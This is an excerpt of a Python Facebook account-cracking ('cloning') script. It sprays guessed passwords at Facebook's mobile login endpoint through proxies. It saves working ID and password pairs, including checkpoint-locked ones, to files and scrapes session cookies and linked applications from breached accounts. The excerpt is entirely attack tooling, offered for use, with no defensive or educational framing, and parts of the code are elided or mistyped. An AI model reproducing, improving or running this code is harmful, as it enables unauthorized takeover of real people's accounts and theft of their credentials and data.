...
def banner():
  ...
  ___ ___ ___ ___ _  _   _   _  __     ___   _  _   _         
 | _ \ _ \ __/ __| || | /_\ | |/ /    | _ ) /_\| | | |        
 |  _/   / _|\__ \ __ |/ _ \| ' <     | _ \/ _ \ |_| |         
 |_| |_|_\___|___/_||_/_/ \_\_|\_\    |___/_/ \_\___/                                                           
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t             ENTER: [green]SEJAHTERA COOKIES[green] '))
...
def menu(my_name,my_id):
	...
	cetak(nel('\tCOOKIE OWNER NAME [green]%s[green] 🇳🇵JAY NEPAL'%(my_name)))
	alvino_xy(f'{u}ID  : '+str(my_id))
	alvino_xy(f'{h}IP  : {ip}')
	cetak(nel('\t[bold white]           • CHOOSE CLONING MENU • [/bold white]'))
	print('')
...
def lah():
	print("\r"+balmond+m+" \x1b[1;95mTOTAL ID TO CRACK :\x1b[1;97m "+str(len(id))+"                     ")
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('\t[bold white]         CLONING MENU • [/bold white]'))
	print('') 
	...
	if hu in ['1','01']:
		...
		print('👉TRY AGAIN')
		exit()
	cetak(nel('\t[bold white]             • METHODE LOGIN • [/bold white]'))
	print('') 
...
#		method.append('touch')
		...
		method.append('mobile')
	print(f'{m}noTE :\n🎀{k}DONT SHOW APPLICATIONS IT WILL SLOW DOWN PROCESS\n🎀PUT DEFULT PASS ') 
	print('')
...
#		taplikasi.append('no')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[green]•[yellow]] ADD PASWORD MXM 6 WORDS\n[[green]•[yellow]] EXIMPLE :[green] 556677,786786,123456[green] '))
...
def passwrd():
	...
	print('')
	print(f'Hasil {h}OK{u} CHEK : {h}OK/%s {b}'%(okc))
	print(f'Hasil {k}CP{h} CHEK : {k}CP/%s {b}'%(cpc))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [green]     SORRY YOU GOT CP ID USE YOUR CITY PUBLIC ID FOR OK IDS [green]'))
				...
				cetak(nel('[green]      🎀🤣 HELLO THIS IS PRESHAK THE KINGG🤣🎀[green]')) 
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_greenirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [green]  SORRY YOURE NOT LUCKED PLEASE BE PATIENT[green]'))
				print(f'\r{K}>> {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[green]      😭HELLO THIS IS PRESHAK THE KING 🤣[green]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					infoakun += (f"\n[bold white][•] LIST ACTIVE APPLICATIONS :[/bold white] \n")
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"[bold white][{nok}] {muncul[0]} {muncul[1]}[/bold white]\n")
						nok+=1
